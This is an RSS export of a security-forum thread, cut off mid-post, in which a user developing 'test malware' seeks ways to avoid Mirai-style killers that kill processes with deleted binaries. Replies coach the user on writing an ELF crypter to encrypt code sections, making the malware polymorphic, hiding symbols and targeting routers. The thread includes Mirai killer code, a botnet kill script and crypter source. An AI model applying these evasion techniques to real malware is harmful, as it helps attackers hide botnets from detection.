<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Malware Killed for &quot; (deleted)&quot; binary</title>
    <link>https://0x00sec.org/t/malware-killed-for-deleted-binary/38022</link>
    <description>my test malware got killed from another because delete the binary, there is a way to bypass this?
or am I forced to keep the binary on the system?

this is the part of the code that kills my test malware, this source code is taken from Mirai malware on github.

(both were launched in the virtual machine)

complete code: https://github.com/jgamblin/Mirai-Source-Code/blob/master/mirai/bot/killer.c

```
 // Store /proc/$pid/exe into exe_path
            snprintf(exe_path, sizeof(exe_path), &quot;/proc/%s/exe&quot;, file-&gt;d_name)


            // Resolve exe_path (/proc/$pid/exe) -&gt; realpath
            if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1)
            {
                realpath[rp_len] = 0; // Nullterminate realpath, since readlink doesn&#39;t guarantee a null terminated string

                // Skip this file if its realpath == killer_realpath
                if (pid == getpid() || pid == getppid() || util_strcmp(realpath, killer_realpath))
                    continue;

               // if the binary was deleted
                if ((fd = open(realpath, O_RDONLY)) == -1)
                {
#ifdef DEBUG
                    printf(&quot;[killer] Process &#39;%s&#39; has deleted binary!\n&quot;, realpath);
#endif
                    kill(pid, 9);
                }
                close(fd);
            }
```</description>
    
    <lastBuildDate>Thu, 21 Mar 2024 13:12:10 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Malware Killed for &quot; (deleted)&quot; binary</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/26">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/26</link>
        <pubDate>Sat, 23 Mar 2024 09:42:28 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38022-26</guid>
        <source url="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022.rss">Malware Killed for &quot; (deleted)&quot; binary</source>
      </item>
      <item>
        <title>Malware Killed for &quot; (deleted)&quot; binary</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Sorry <a class="mention" href="https://0x00sec.org/u/paola32">@paola32</a> … I completely missed this post.</p>
<p>Yes you are right… <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=12" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></p>
          <p><a href="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/25">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/25</link>
        <pubDate>Thu, 21 Mar 2024 13:12:10 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38022-25</guid>
        <source url="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022.rss">Malware Killed for &quot; (deleted)&quot; binary</source>
      </item>
      <item>
        <title>Malware Killed for &quot; (deleted)&quot; binary</title>
        <dc:creator><![CDATA[paola32]]></dc:creator>
        <description><![CDATA[
            <p>I found an ioT botnet that executes the following shell script upon start up:</p>
<pre><code class="lang-auto">#!/bin/sh

for proc_dir in /proc/*; do
    pid=${proc_dir##*/}

    result=$(ls -l "/proc/$pid/exe" 2&gt; /dev/null)

    if [ "$result" != "${result%(deleted)}" ]; then
        kill -9 "$pid"
    fi
done
</code></pre>
<p>I guess the bypass with the link() will be as well killed by this shell script?</p>
          <p><a href="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/23">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/23</link>
        <pubDate>Tue, 09 Jan 2024 21:26:43 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38022-23</guid>
        <source url="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022.rss">Malware Killed for &quot; (deleted)&quot; binary</source>
      </item>
      <item>
        <title>Malware Killed for &quot; (deleted)&quot; binary</title>
        <dc:creator><![CDATA[darad]]></dc:creator>
        <description><![CDATA[
            <p>thank you infinitely, in reality I had already found the document before the suggestion, but I thought it wasn’t useful in my case and therefore to try with shellcode <img src="https://0x00sec.org/images/emoji/twitter/sweat_smile.png?v=12" title=":sweat_smile:" class="emoji" alt=":sweat_smile:" loading="lazy" width="20" height="20">.<br>
I did a lot of research looking at the ezuri code: <a href="https://github.com/guitmz/ezuri" class="inline-onebox" rel="noopener nofollow ugc">GitHub - guitmz/ezuri: A Simple Linux ELF Runtime Crypter</a> and this: <a href="https://github.com/droberson/ELFcrypt" class="inline-onebox" rel="noopener nofollow ugc">GitHub - droberson/ELFcrypt: Simple ELF crypter. Uses RC4 encryption.</a>, <a href="https://github.com/0x00pf/0x00sec_code/blob/master/crypter/polycrypt.c" rel="noopener nofollow ugc">https://github.com/0x00pf/0x00sec_code/blob/master/crypter/polycrypt.c</a><br>
now I will better understand how <code>__atribute__</code> works.</p>
          <p><a href="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/22">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/22</link>
        <pubDate>Tue, 12 Dec 2023 18:38:38 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38022-22</guid>
        <source url="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022.rss">Malware Killed for &quot; (deleted)&quot; binary</source>
      </item>
      <item>
        <title>Malware Killed for &quot; (deleted)&quot; binary</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>You found it quickly <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=12" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"> … Maybe I gave to much hints <img src="https://0x00sec.org/images/emoji/twitter/sweat_smile.png?v=12" title=":sweat_smile:" class="emoji" alt=":sweat_smile:" loading="lazy" width="20" height="20"></p>
<p>Now take a look to <code>__atribute__ ((constructor))</code> to get a cleaner solution and you are done with the C part <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=12" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"> …</p>
          <p><a href="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/21">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/21</link>
        <pubDate>Tue, 12 Dec 2023 18:23:07 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38022-21</guid>
        <source url="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022.rss">Malware Killed for &quot; (deleted)&quot; binary</source>
      </item>
      <item>
        <title>Malware Killed for &quot; (deleted)&quot; binary</title>
        <dc:creator><![CDATA[darad]]></dc:creator>
        <description><![CDATA[
            <p>Thank you for the reply, one idea(it’s not completely my own work, I looked at many examples around, I found this interesting: <a href="https://epitech-lyon.github.io/blackstar/" class="inline-onebox" rel="noopener nofollow ugc">Introduction to Malware Obfuscation Using ELF Sections | Epitech-Lyon</a>) is to create a new section that contains:</p>
<pre><code class="lang-auto">#define SECTION(x) __attribute__((section(x)))

SECTION(".stub") void stub(char *argv0)
{
     //code to map the elf
    .....
    //code to find sections
    ....
   decrypt(p + sh...);
}

int main(int argc, char **argv)
{
     stub(argv0);
}
</code></pre>
<p>and call this function in the only part of the main that has not been encrypted, I hope I understood correctly.</p>
          <p><a href="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/20">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/20</link>
        <pubDate>Tue, 12 Dec 2023 17:56:36 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38022-20</guid>
        <source url="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022.rss">Malware Killed for &quot; (deleted)&quot; binary</source>
      </item>
      <item>
        <title>Malware Killed for &quot; (deleted)&quot; binary</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>That won’t work. It will dump the whole <code>.text</code> section that for a executable contains much more than just <code>main</code>.</p>
<p>If you want to write the whole code in C, just call the <code>stub</code> from <code>main</code>. There are more elegant ways of doing that, but just calling it from <code>main</code> is the simplest and works. Your main problem is how to differentiate between your <code>stub</code>  and the code you want to crypt/decrypt.</p>
<p>There are  different solutions for that, the easiest is to put your code together and add a <code>dummy</code> function before main (and pray to the Void* Godess to not re-order your code). Then you need to crypt between the first function and the dummy function… however, this is a crappy solution as the compiler or the linker may reorganise your code and things will stop working… But you may give it a try to this as it is conceptually simpler. Then you can work out your solution from there. This will also help you to get fluent with <code>readelf</code> and <code>objdump</code> tools.</p>
<pre><code class="lang-c">
int this_will_be_crypted () {....}
int this_will_also_be_crypted () {..}
(....)
int i_stop_crypting_here () {...}

int stub_written_in_C () {
  void *start = this_will_be_crypted;
  void *end = i_stop_crypting_here;
  size_t size = end - start;

 // Change memory permissions
// Crypt/Decrypt size bytes starting at start

}

in main () {
  stub_written_in_C ();
}

</code></pre>
<p>You should check that actually all the code you want to crypt is consecutive in memory and the <code>I_stop_crypting_here</code> function is the last one. For a simple program should work (for a single function should work <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=12" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"> ). Do not try to go for a full-fledge application. Use <code>objdump</code> for checking that. You can also try to add your own symbols (labels) at the end of each function so you now where they start and where they end. Then you need to crypt/decrypt each one separately.</p>
<p>When do you understand how this works… just look for a way to let the compiler or linker group all your code together. Just do smaller steps, otherwise some concepts are just too difficult to grasp at first.</p>
<p>Hope this helps</p>
          <p><a href="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/19">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/19</link>
        <pubDate>Tue, 12 Dec 2023 17:10:12 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38022-19</guid>
        <source url="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022.rss">Malware Killed for &quot; (deleted)&quot; binary</source>
      </item>
      <item>
        <title>Malware Killed for &quot; (deleted)&quot; binary</title>
        <dc:creator><![CDATA[darad]]></dc:creator>
        <description><![CDATA[
            <p>hi <a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a> if I wrote the stub in c, is the procedure the same to obtain the shellcode?<br>
stub.c</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main()
{
    printf("hello world\n");

    return 0;
}
</code></pre>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/7/c/7c3fde1f6e8d0f07fa1b8cd859010281f807de40.png" data-download-href="/uploads/short-url/hJa2C90nN8Q100EUDUJ88cvewjC.png?dl=1" title="Screenshot_1" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/7/c/7c3fde1f6e8d0f07fa1b8cd859010281f807de40.png" alt="Screenshot_1" data-base62-sha1="hJa2C90nN8Q100EUDUJ88cvewjC" width="690" height="460" data-dominant-color="1F1F1F"></a></div><p></p>
          <p><a href="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/18">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/18</link>
        <pubDate>Mon, 11 Dec 2023 18:21:32 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38022-18</guid>
        <source url="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022.rss">Malware Killed for &quot; (deleted)&quot; binary</source>
      </item>
      <item>
        <title>Malware Killed for &quot; (deleted)&quot; binary</title>
        <dc:creator><![CDATA[phpio]]></dc:creator>
        <description><![CDATA[
            <p>That’s a great question. I will just second <a href="https://0x00sec.org/u/0x00pf">0x00pf</a>. They seem to have laid out the best way to solve this.</p>
          <p><a href="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/17">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/17</link>
        <pubDate>Tue, 28 Nov 2023 15:50:32 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38022-17</guid>
        <source url="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022.rss">Malware Killed for &quot; (deleted)&quot; binary</source>
      </item>
      <item>
        <title>Malware Killed for &quot; (deleted)&quot; binary</title>
        <dc:creator><![CDATA[darad]]></dc:creator>
        <description><![CDATA[
            <p>ok yes, I think it’s the length of the key, trying rc4 with the key “0x00Sec!\0” works, in the sense that it prints “Illegal instructions”, while if I change the key to “0x00SecSoc!\0” it prints Segmentation Fault.<br>
ok, while if I run rc4 again the binary file works again, well, I might try implementing rc6.</p>
          <p><a href="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/16">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/16</link>
        <pubDate>Sun, 26 Nov 2023 23:13:13 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38022-16</guid>
        <source url="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022.rss">Malware Killed for &quot; (deleted)&quot; binary</source>
      </item>
      <item>
        <title>Malware Killed for &quot; (deleted)&quot; binary</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>First instalment just tell you how to implement RC4 and how to crypt the <code>.text</code> and <code>.rodata </code> sections. The output you get from your program cannot be executed yet. It is missing the  <code>stub</code> that is added in the next installments. So it is normal that the program crashes. It usually does it with an illegal instruction exception tho. Using a <code>xor</code> encoder you can just run the crypter again to verify the code is restored. If it works with rc4 that means something is wrong.</p>
<p>Also note that the way you implement <code>xor</code> is strange.  I’d expect something like this, for example:</p>
<pre><code class="lang-c">    for (size_t i = 0; i &lt; data_len; i+=4)
    {
        data[i]     ^= k1;
        data[i + 1] ^= k2;
        data[i + 2] ^= k3;
        data[i + 3] ^= k4;
        ++cnt;
    }
</code></pre>
          <p><a href="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/15">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/15</link>
        <pubDate>Sun, 26 Nov 2023 22:55:42 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38022-15</guid>
        <source url="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022.rss">Malware Killed for &quot; (deleted)&quot; binary</source>
      </item>
      <item>
        <title>Malware Killed for &quot; (deleted)&quot; binary</title>
        <dc:creator><![CDATA[darad]]></dc:creator>
        <description><![CDATA[
            <p>hi, I’m following the post on the elf crypter, everything works, except when it uses the encryption function, in my case I tried xor and aes, with both it doesn’t work (when i try to run the binary it print seg fault), while if I use your rc4 algorithm it works, I don’t understand why, this is my code.<br>
I’m still stuck at the first document ( <a href="https://0x00sec.org/t/programming-for-wanabes-xiii-crypters-part-i/27598">Programming for Wanabes XIII. Crypters part I</a>) because I’m trying to modify your crypter and add something, also to understand how the elf headers work.<br>
I’m pretty sure there’s something wrong with the encryption stage.</p>
<pre><code class="lang-auto">static uint32_t table_key = 0xcafebabe;

int main (int argc, char *argv[])
{
	if (argc != 2) 
	{
    		fprintf (stderr, "Invalid number of parameters\n");
    		fprintf (stderr, "Usage: crypter &lt;binary&gt;\n");
    		exit(-1);
  	}

	int fd = -1;
	if((fd = open(argv[1], O_RDWR)) == -1)
		exit(-1);

	struct stat _st;
	if((fstat (fd, &amp;_st)) == -1)
		exit(-1);

	unsigned char *p;
	if ((p = mmap (0, _st.st_size, PROT_READ | PROT_WRITE,
		 MAP_SHARED, fd, 0)) == MAP_FAILED)
	{
		fprintf (stderr, "Error mapping the binary\n");
		exit(-1);
	}

	Elf64_Ehdr *elf_header = (Elf64_Ehdr*)p;
	printf("Magic Bytes: %02x %c %c %c\n", elf_header-&gt;e_ident[0], elf_header-&gt;e_ident[1], elf_header-&gt;e_ident[2], elf_header-&gt;e_ident[3]);
	if (memcmp(elf_header-&gt;e_ident, ELFMAG, SELFMAG) != 0)
	{
    	fprintf(stderr, "Invalid file format\n");
    	fprintf(stderr, "Elf Required!\n");
    	munmap(p, _st.st_size);
    	close(fd);
    	exit(-1);
	}

	if(elf_header-&gt;e_type != ET_DYN)
	{
		fprintf (stderr, "File is not an executable\n");
		munmap(p, _st.st_size);
    	close(fd);
    	exit(-1);
	}


	printf ("Section Table located at : %ld\n", elf_header-&gt;e_shoff);
	printf ("Section Table entry size : %hu\n", elf_header-&gt;e_shentsize);
	printf ("Section Table entries    : %hu\n", elf_header-&gt;e_shnum);

	Elf64_Shdr *sh = (Elf64_Shdr*)(p + elf_header-&gt;e_shoff);
	unsigned char *s_name   = p + sh[elf_header-&gt;e_shstrndx].sh_offset;
	unsigned char *name = NULL;
	//char *key ="0x00Sec!\0";
	for (size_t i = 0; i &lt; elf_header-&gt;e_shnum; i++)
	{
		name = s_name + sh[i].sh_name;
 		if (!strcmp((const char *)name, ".text") || !strcmp ((const char *)name, ".rodata"))
 		{
 			printf ("Section %02zu [%s]: Type: %d Flags: %lx Off: %lx Size: %lx =&gt; ",i, name,sh[i].sh_type, sh[i].sh_flags,sh[i].sh_offset, sh[i].sh_size);
	  		if (sh[i].sh_offset + sh[i].sh_size &gt; _st.st_size)
	  		{
            	fprintf(stderr, "Error: Attempting to XOR beyond the end of the file.\n");
            	munmap(p, _st.st_size);
            	close(fd);
            	exit(-1);
        	}

	  		//rc4(p + sh[i].sh_offset, sh[i].sh_size, (unsigned char*)key, strlen (key));
	  		xor(p + sh[i].sh_offset, sh[i].sh_size);
      		puts(" - Crypted!");
  		}

 	}

	munmap(p, _st.st_size);
    close(fd);
	return 0;
}

static void xor(unsigned char *data, size_t data_len)
{
    uint8_t k1 = table_key &amp; 0xff, k2 = (table_key &gt;&gt; 8) &amp; 0xff, k3 = (table_key &gt;&gt; 16) &amp; 0xff, k4 = (table_key &gt;&gt; 24) &amp; 0xff;
    uint32_t cnt = 0;
    for (size_t i = 0; i &lt; data_len; i++)
    {
        data[i] ^= k1;
        data[i] ^= k2;
        data[i] ^= k3;
        data[i] ^= k4;
        ++cnt;
    }
    printf(" [%d bytes encoded]", cnt);
}
</code></pre>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/2/4/24c7834f1d55312d2e14c4e37c4ef5d3d4666494.png" data-download-href="/uploads/short-url/5fmDTghEbT80b7Bhje0zgcdJR5y.png?dl=1" title="Screenshot_1" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/2/4/24c7834f1d55312d2e14c4e37c4ef5d3d4666494.png" alt="Screenshot_1" data-base62-sha1="5fmDTghEbT80b7Bhje0zgcdJR5y" width="690" height="186" data-dominant-color="161616"></a></div><p></p>
          <p><a href="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/14">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/14</link>
        <pubDate>Sun, 26 Nov 2023 22:01:28 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38022-14</guid>
        <source url="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022.rss">Malware Killed for &quot; (deleted)&quot; binary</source>
      </item>
      <item>
        <title>Malware Killed for &quot; (deleted)&quot; binary</title>
        <dc:creator><![CDATA[darad]]></dc:creator>
        <description><![CDATA[
            <p>perfect, thank you very much, these posts are very interesting and will definitely help me.</p>
          <p><a href="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/13">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/13</link>
        <pubDate>Sat, 25 Nov 2023 18:10:04 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38022-13</guid>
        <source url="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022.rss">Malware Killed for &quot; (deleted)&quot; binary</source>
      </item>
      <item>
        <title>Malware Killed for &quot; (deleted)&quot; binary</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <aside class="quote no-group" data-username="darad" data-post="11" data-topic="38022">
<div class="title">
<div class="quote-controls"></div>
<img loading="lazy" alt="" width="24" height="24" src="https://0x00sec.org/letter_avatar_proxy/v4/letter/d/b2d939/48.png" class="avatar"> darad:</div>
<blockquote>
<p>I will modify the code using musl or uLibC, because from what I understand it is not very useful to use dlsym and dlopen (or at least in this case).</p>
</blockquote>
</aside>
<p>It all depends on what you want to do. I do not think it is usuful to use <code>dlXXX</code> with libC, but may be cases where that may be the way forward. There is no magic solution for all cases. You need to think about what you want to achieve and find the better solution.</p>
<p>For example, using <code>uLibC</code> statically will make your program bigger because all the code you use from <code>libc.so</code> is now included in your binary. On the other hand, your program will work on any system, despite of the <em>libC</em> version installed on it. As I said, it depends on what you want. If you are targetting routers… many of those runs <code>busybox</code> using <code>uLibC</code>… no <code>libc.so</code> in the filesystem …so you will have to transfer the library together with your program to make it work. So, you are not saving any space in the size of your program… actually the other way around.</p>
<aside class="quote no-group" data-username="darad" data-post="11" data-topic="38022">
<div class="title">
<div class="quote-controls"></div>
<img loading="lazy" alt="" width="24" height="24" src="https://0x00sec.org/letter_avatar_proxy/v4/letter/d/b2d939/48.png" class="avatar"> darad:</div>
<blockquote>
<p>I was also thinking of making the code metamorphic/polymorphic but I think it’s a bit complicated, since if I have to compile the malware to make it work on various architectures I have to use assemblies of each specific architecture such as ARM, MIPS etc…</p>
</blockquote>
</aside>
<p>The easy way to make your code polymorphic is using a crypter. Over all, you want your crypter stub to be small as that is the part that doesn’t change and that is why many times it is implemented in asm (among other reasons), but you can implement the stub in C if you want. Take a look to this series on crypters from some time ago. Still valid tho, as far as I reckon . The stub is coded in asm on those posts, but they describe what you have to do, so you just can implement it using C:</p>
<aside class="quote quote-modified" data-post="1" data-topic="27598">
  <div class="title">
    <div class="quote-controls"></div>
    <img loading="lazy" alt="" width="24" height="24" src="https://0x00sec.org/user_avatar/0x00sec.org/0x00pf/48/13708_2.png" class="avatar">
    <a href="https://0x00sec.org/t/programming-for-wanabes-xiii-crypters-part-i/27598">Programming for Wanabes XIII. Crypters part I</a> <a class="badge-wrapper  bullet" href="https://0x00sec.org/c/programming/61"><span class="badge-category-bg" style="background-color: #92278F;"></span><span style="" data-drop-close="true" class="badge-category clear-badge">Programming</span></a>
  </div>
  <blockquote>
    This is the first instalment to dive you deep into the awesome world of crypters. You will learn everything about these little guys which are a usual component of different types of malware, including the RATs that we are discussing right now. 
Technically, crypters, in their traditional form, are closer related to virus, than to any other malware, in the sense that they require in deep knowledge of the binary format of the target system (ELF, PE,…), but this looks like a good time to start digg…
  </blockquote>
</aside>
<aside class="quote quote-modified" data-post="1" data-topic="27696">
  <div class="title">
    <div class="quote-controls"></div>
    <img loading="lazy" alt="" width="24" height="24" src="https://0x00sec.org/user_avatar/0x00sec.org/0x00pf/48/13708_2.png" class="avatar">
    <a href="https://0x00sec.org/t/programming-for-wannabes-xiv-crypters-part-ii/27696">Programming for Wannabes XIV. Crypters Part II</a> <a class="badge-wrapper  bullet" href="https://0x00sec.org/c/programming/61"><span class="badge-category-bg" style="background-color: #92278F;"></span><span style="" data-drop-close="true" class="badge-category clear-badge">Programming</span></a>
  </div>
  <blockquote>
    In the previous instalment we manage to find the relevant parts of the binary to crypt and actually crypt them. Now we need to inject our stub code and modify the binary to execute it before anything else. This gonna be fun. 

<a name="a-test-stub-1" class="anchor" href="https://0x00sec.org#a-test-stub-1"></a>A Test Stub
Instead of going with the full stub I will first introduce a very simple one so we can focus on the code injection concept. Why?. Well, this is how I actually did it. The real stuff is a relatively complex program that will have its own bugs, so we better use a…
  </blockquote>
</aside>
<aside class="quote quote-modified" data-post="1" data-topic="27934">
  <div class="title">
    <div class="quote-controls"></div>
    <img loading="lazy" alt="" width="24" height="24" src="https://0x00sec.org/user_avatar/0x00sec.org/0x00pf/48/13708_2.png" class="avatar">
    <a href="https://0x00sec.org/t/progamming-for-wannabes-xv-crypters-part-iii/27934/1">Progamming for Wannabes XV. Crypters Part III</a> <a class="badge-wrapper  bullet" href="https://0x00sec.org/c/programming/61"><span class="badge-category-bg" style="background-color: #92278F;"></span><span style="" data-drop-close="true" class="badge-category clear-badge">Programming</span></a>
  </div>
  <blockquote>
    Finally we are going to get our crypter complete and operational. We have already covered the main technical areas involving ohow ton crypt binaries and now we just need to commit. We already have a complete crypter able to crypt the relevant parts of the code and inject our stub using different techniques. We are only missing the final version of our stub. 
In this last instalment we are going to put together all the elements to get our stub complete. 

<a name="what-does-that-stub-do-again-1" class="anchor" href="https://0x00sec.org#what-does-that-stub-do-again-1"></a>What does that stub do again?
Before cont…
  </blockquote>
</aside>

          <p><a href="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/12">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/12</link>
        <pubDate>Sat, 25 Nov 2023 17:42:04 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38022-12</guid>
        <source url="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022.rss">Malware Killed for &quot; (deleted)&quot; binary</source>
      </item>
      <item>
        <title>Malware Killed for &quot; (deleted)&quot; binary</title>
        <dc:creator><![CDATA[darad]]></dc:creator>
        <description><![CDATA[
            <p>Thank you, this is all clearer too, I wasn’t aware of what you explained to me now.<br>
I will modify the code using musl or uLibC, because from what I understand it is not very useful to use dlsym and dlopen (or at least in this case).<br>
I’ll take a look at the strip options too.<br>
I was also thinking of making the code metamorphic/polymorphic but I think it’s a bit complicated, since if I have to compile the malware to make it work on various architectures I have to use assemblies of each specific architecture such as ARM, MIPS etc…</p>
          <p><a href="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/11">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/11</link>
        <pubDate>Sat, 25 Nov 2023 14:35:20 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38022-11</guid>
        <source url="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022.rss">Malware Killed for &quot; (deleted)&quot; binary</source>
      </item>
      <item>
        <title>Malware Killed for &quot; (deleted)&quot; binary</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Unless you have done some something special, your program is already linked to <code>libc</code>. In other words, it doesn’t mater if you <code>dlopen</code> the library, because it is already there. Try to comment out the code that <code>dlopen</code> the library and you will still see the same mapping.</p>
<p>For example, this code works:</p>
<pre><code class="lang-c">#include &lt;dlfcn.h&gt;

int main () {
  void *h = dlopen (0x0, RTLD_LAZY);
  
  void (*my_puts)(char *) = dlsym (h, "puts");
  my_puts ("Hello World");
}
</code></pre>
<p>If you compile and run it…</p>
<pre><code>$ gcc -o test1 test1.c -ldl
$ ./test1
Hello World
</code></pre>
<p>because <code>libc</code> is already mapped (you do not need to open it, it is already there.<br>
Summing up:</p>
<ul>
<li>You do not need to <code>dlopen</code> libC unless you have compiled your program specially to not include it. Even then, it is likely that some things won’t work unless you make sure that all the initialisation performed by the library is done by your program… and then you end up doing the same thing that libC does</li>
<li>Doesn’t matter if you <code>dlopen</code> libc or just linked it dynamically. Your binary will be the same size (that’s the main goal of dynamic libraries) and the memory footprint will also be the same as, in both cases, libC gets loaded in memory anyhow</li>
<li>AFAIK <code>dlsym</code> resolves symbols, doesn’t extract pieces of code of a library. Just take some non-trivial library out there, and start importing function and check if the mapping of that library changes (grows). Honestly I do not know if that is the case, but I believe the whole thing is loaded at once (when memory pages get actually filled in is something else).</li>
</ul>
<aside class="quote no-group" data-username="darad" data-post="7" data-topic="38022">
<div class="title">
<div class="quote-controls"></div>
<img loading="lazy" alt="" width="24" height="24" src="https://0x00sec.org/letter_avatar_proxy/v4/letter/d/b2d939/48.png" class="avatar"> darad:</div>
<blockquote>
<p>my intent was to hide the functions and get a smaller binary file by loading only the necessary functions</p>
</blockquote>
</aside>
<p>To hide the functions names you can just strip your binary and remove any symbols. People can still reverse engineer your program… people can always reverse engineer your program. <code>dlsym</code>ing obfuscated functions is actually worst, because you can reverse the obfuscated function name and get the names of the function… However, I’m curious about what is the rational on hiding standard libC functions…</p>
<p>To make your binary smaller you better go for a libC version targetting embedded systems like musl or uLibC. You can customise what you want in the library (at least for uLibC)  and also, as far as I remember you can compile it as a static library. With a static library the code you don’t use is not included at linking stage… at the level of the object files packed together in the library (not at function levels).</p>
          <p><a href="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/10</link>
        <pubDate>Sat, 25 Nov 2023 10:07:17 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38022-10</guid>
        <source url="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022.rss">Malware Killed for &quot; (deleted)&quot; binary</source>
      </item>
      <item>
        <title>Malware Killed for &quot; (deleted)&quot; binary</title>
        <dc:creator><![CDATA[darad]]></dc:creator>
        <description><![CDATA[
            <p>hi <a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a></p>
<p>this is the /proc/pid/maps of the malware<br>
